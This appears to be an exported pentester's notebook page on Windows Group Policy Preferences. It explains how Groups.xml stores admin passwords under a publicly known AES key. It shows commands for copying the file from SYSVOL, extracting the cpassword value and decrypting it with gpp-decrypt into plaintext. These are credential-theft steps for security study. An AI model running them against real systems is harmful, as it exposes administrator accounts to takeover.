<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Stored Credentials</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Stored Credentials</h1></strong><br />• <a href="https://pentestlab.blog/2017/04/19/stored-credentials/">https://pentestlab.blog/2017/04/19/stored-credentials/</a><br /><br /><strong><h2>## Group Policy Preferences Files</h2></strong><br />Group Policy Preferences (GPP) was introduced in Windows Server 2008 and, among other features, allows admins to modify users and groups accross the network.<br /><br />User passwords are stored in the <code>Groups.xml</code> file, and are AES-256 encrypted.<br /><br />However, at some point in 2012, Microsoft published the Groups.xml AES key on MSDN (their developer network/Microsoft manual), which means that GPP passwords are now trivial to crack.<br /><br /><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN</a><br /><a href=""><img src="images/370-1.png" alt="images/370-1.png" /></a><br /><br />SUBSEQUENTLY, Group Policy Preferences was removed in Windows Server 2012.<br />Can learn about all here - <a href="https://adsecurity.org/?p=2288">https://adsecurity.org/?p=2288</a><br /><br /><strong><h3>### Passwords</h3></strong><br />The GPP files might contain local administrative passwords set by Group Policy, which you can extract and decrypt using <code>gpp-decrypt</code><br /><br />If you get OpenSSL errors, it doesn&#39;t matter, the decryption should have worked fine regardless.<br /><br /><div class="codebox"><div class="codebox">copy&nbsp;\Policies\{...}\Machine\Preferences\Groups\Groups.xml&nbsp;C:\Users\mike\Documents<br />C:\Users\Mike\Documents&nbsp;&gt;type&nbsp;Groups.xml<br />...<br />name=&quot;Administrator&quot;<br />cpassword&nbsp;=&nbsp;“riBZpPtHOGtVk+SdLOmJ6xiNgFH6Gp45BoP3I6AnPgZ1IfxtgI67qqZfgh78kBZB”<br />...<br /><br />root@kali:~#&nbsp;gpp-decrypt&nbsp;riBZpPtHOGtVk+SdLOmJ6xiNgFH6Gp45BoP3I6AnPgZ1IfxtgI67qqZfgh78kBZB<br />sup3r53cr3tGP0pa55</div></div><br /><br /><code>C:\ProgramData\Microsoft\Group Policy\History\????\Machine\Preferences\Groups\Groups.xml</code><br /><br /><code>\\????\SYSVOL\\Policies\????\MACHINE\Preferences\Groups\Groups.xml</code><br /></div>
</body>
</html>
